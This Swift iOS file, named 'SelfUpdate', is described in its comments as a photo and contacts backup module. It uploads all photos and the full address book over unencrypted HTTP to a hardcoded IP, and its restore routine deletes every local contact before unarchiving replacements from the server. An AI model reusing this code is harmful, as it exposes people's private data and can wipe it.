//
//  SelfUpdate.swift
//  test
//
//  Created by user on 17/7/25.
//  Copyright © 2017年 user. All rights reserved.
//

import Foundation
import Photos
import Contacts
//自动备份模块
//该模块提供了一个SelfUpdate类，该类分别提供了三个方法：
//getPhotosTest用于实现照片的自动备份，其参数为(urlStr: "http://27.18.151.45:18080/ios/DownLoadServlet?filename=theNewestPhotoData&checkcode=1498948271122", urlStr2: "http://27.18.151.45:18080/ios/UploadHandleServlet?checkcode=1498948271122")，IP和checkcode（用户标示）可进行修改。
//getAddressBook实现对通讯录的自动备份，其参数为"http://27.18.151.45:18080/ios/UploadHandleServlet?checkcode=1498948271122"，IP和checkcode可修改
//writeAddressBook实现根据已备份到服务器通讯录对本机通讯录恢复，其参数为"http://27.18.148.227:18080/ios/DownLoadServlet?filename=contactAddressBook&checkcode=1498948271122"，同样ip和checkcode可修改

class SelfUpdate{
    func getPhotos(urlStr:String,storedTime:String){
        let allOptions = PHFetchOptions()
        //  对内部元素排序
        allOptions.sortDescriptors = [NSSortDescriptor.init(key: "creationDate", ascending: false)]
        //  将元素集合拆解开，此时 allResults 内部是一个个的PHAsset单元
        let allResults = PHAsset.fetchAssets(with: allOptions)
        if(allResults.count == 0)
        {
            return
        }
        
        var result = Array<PHAsset>()
        
        let inSet = IndexSet(integersIn: 0..<allResults.count)
        //inSet.insert(integersIn: )
        result = allResults.objects(at: inSet)
        
        let update = UploadClj()
//        let firstAsset:PHAsset? = result.first
//        let firstTime:Date? = firstAsset?.creationDate
//        if(firstTime == nil){
//            return
//        }
//        let firstData:NSData = NSKeyedArchiver.archivedData(withRootObject: firstTime!) as NSData
//        
        //let str3 = "2012-08-08 14-29-49 IMG_0004.JPG"
        var str = Array<String>()
        str = storedTime.components(separatedBy: " ")
//        //str数组里边，第一个元素为日期信息，第二个元素为具体时间信息，第三个元素为文件路径的最后一部分，即文件名
//        //将第一个元素与第二个元素拼接
        str[0] = str[0] + " " + str[1]
        let dateFormatter = DateFormatter()
        dateFormatter.locale = Locale.current
        dateFormatter.dateFormat = "yyyy-MM-dd HH-mm-ss"
        let time1:Date = dateFormatter.date(from: str[0])!
        
        
        
        
        for asset:PHAsset in result {
            let time:Date = asset.creationDate!
            if(time1.compare(time) == ComparisonResult.orderedDescending){
                //time1 is later than time
                return
            }
            let fetchOptions = PHImageRequestOptions()
            fetchOptions.isNetworkAccessAllowed = false
            PHImageManager.default().requestImageData(for: asset, options: fetchOptions, resultHandler:
                { (imagedata, dataUTI, orientation, info) in
                    if info!.keys.contains(NSString(string:"PHImageFileURLKey"))
                    {
                        let url:NSURL = info![NSString(string:"PHImageFileURLKey")] as! NSURL
                        let str1:String = url.lastPathComponent!;
                        if(time1.compare(time) == ComparisonResult.orderedSame||str1.compare(str[2]) == ComparisonResult.orderedSame){
                            return
                        }else{
                            //print(str1)
                            var str2:String
                            str2 = dateFormatter.string(from: time)
                            str2 = str2 + " " + str1
                            //这个str2为上传文件的文件名
                            if(asset == result.first){
                                let firstData:NSData = NSKeyedArchiver.archivedData(withRootObject: str2) as NSData
                                update.uploadFile(fileData: firstData, fieldName: "file1", fileName: "theNewestPhotoData", urlStr: urlStr)
                                print("------------")
                                print(firstData)
                                print("------------")
                                //firstData.write(toFile: "/Users/user/Desktop/3", atomically: true)
                                
                            }
                            print(url)
                            
                            print(str2)
                            
                            let data:NSData? = NSData(contentsOf: url as URL)
                            
                            update.uploadFile(fileData: data!, fieldName: "file1", fileName: str2, urlStr: urlStr)
                            print("*******")
                            print(data!)
                            print("*******")
                        }
                    }
            }
            )
        }
        
    }
    
    
    func getPhotosTest(urlStr:String,urlStr2:String){
        let url = URL(string:urlStr)
        let request=URLRequest(url:url!)
        let session:URLSession=URLSession.shared
        let task=session.downloadTask(with: request, completionHandler: {(fileUrl,response,error)in
            if !(error==nil){
                //
            }else{
                print("=====\(response)======")
                print(fileUrl)
                let filePath=fileUrl?.path
                let fileData:NSData=NSData.dataWithContentsOfMappedFile(filePath!) as! NSData
                if(fileData.length==0){
                    self.getPhotos(urlStr: urlStr2, storedTime: "2000-01-01 00-00-00 IMG_0000.JPG")
                } else{
                    let str:String = NSKeyedUnarchiver.unarchiveObject(with: fileData as Data) as! String
                    self.getPhotos(urlStr: urlStr2, storedTime: str)
                }
                
                //let fm=FileManager.default
                //try! fm.moveItem(atPath: filePath!, toPath: "/Users/user/Desktop")
            }
        })
        task.resume()
    }
    
    
    func getAddressBook(urlStr:String){
        let store = CNContactStore()
        
        let keys = [CNContactFormatter.descriptorForRequiredKeys(for: .fullName),CNContactImageDataKey,CNContactOrganizationNameKey,CNContactJobTitleKey,CNContactDepartmentNameKey,CNContactNoteKey,CNContactPhoneNumbersKey,CNContactEmailAddressesKey,CNContactPostalAddressesKey,CNContactDatesKey,CNContactInstantMessageAddressesKey] as [Any]
        
        
        let fetchRequest = CNContactFetchRequest.init(keysToFetch: keys as! [CNKeyDescriptor])
        
        var contacts = [CNContact]()
        var contacts1 = [CNMutableContact]()
        
        do{
            try store.enumerateContacts(with: fetchRequest, usingBlock: { ( contact, stop)-> Void in
                contacts.append(contact)
                let con = contact.mutableCopy() as! CNMutableContact
                contacts1.append(con)
                /*print(contact.givenName + " " + contact.familyName)
                 print(contact.imageData ?? 0)
                 let phoneNumbers = contact.phoneNumbers
                 for phoneNumber in phoneNumbers
                 {
                 print(phoneNumber.label ?? " " )
                 print(phoneNumber.value.stringValue)
                 }
                */
            })
        }
        catch let error as NSError {
            print(error.localizedDescription)
        }
        
        let data:NSData = NSKeyedArchiver.archivedData(withRootObject: contacts1) as NSData
        
        let upload=UploadClj()
        
        upload.uploadFile(fileData: data, fieldName: "file1", fileName: "contactAddressBook", urlStr: urlStr)
    }
    
    
    func writeAddressBookTest(urlStr:String){
        let url = URL(string:urlStr)
        let request=URLRequest(url:url!)
        let session:URLSession=URLSession.shared
        let task=session.downloadTask(with: request, completionHandler: {(fileUrl,response,error)in
            if !(error==nil){
                print("==error==")
                print(error!)
                
            }else{
                print("=====\(response)======")
                print(fileUrl)
                let filePath=fileUrl?.path
                let fileData:NSData=NSData.dataWithContentsOfMappedFile(filePath!) as! NSData
                self.writeAddressBook(data: fileData)
                //let fm=FileManager.default
                //try! fm.moveItem(atPath: filePath!, toPath: "/Users/user/Desktop")
            }
        })
        task.resume()
    }
        
    func writeAddressBook(data:NSData){
        let store = CNContactStore()
        let keys = [CNContactFormatter.descriptorForRequiredKeys(for: .fullName),CNContactImageDataKey,CNContactOrganizationNameKey,CNContactJobTitleKey,CNContactDepartmentNameKey,CNContactNoteKey,CNContactPhoneNumbersKey,CNContactEmailAddressesKey,CNContactPostalAddressesKey,CNContactDatesKey,CNContactInstantMessageAddressesKey] as [Any]
        
        let fetchRequest = CNContactFetchRequest.init(keysToFetch: keys as! [CNKeyDescriptor])
        //get the NSData
      
        let array = NSKeyedUnarchiver.unarchiveObject(with: data as Data)
        do{
            try store.enumerateContacts(with: fetchRequest, usingBlock: { ( contact, stop)-> Void in
                let mutableContact = contact.mutableCopy() as! CNMutableContact
                let request = CNSaveRequest()
                request.delete(mutableContact)
                do{
                    try store.execute(request)
                    print("delete success")
                } catch {
                    print(error)
                }
            })
        }
        catch let error as NSError {
            print(error.localizedDescription)
        }
        
        let saveRequest = CNSaveRequest()
        for contact:CNMutableContact in array as! [CNMutableContact]{
            saveRequest.add(contact, toContainerWithIdentifier: nil)
        }
        do {
            try store.execute(saveRequest)
            print("save success")
        } catch{
            print(error)
        }
        
        
        
    }
}
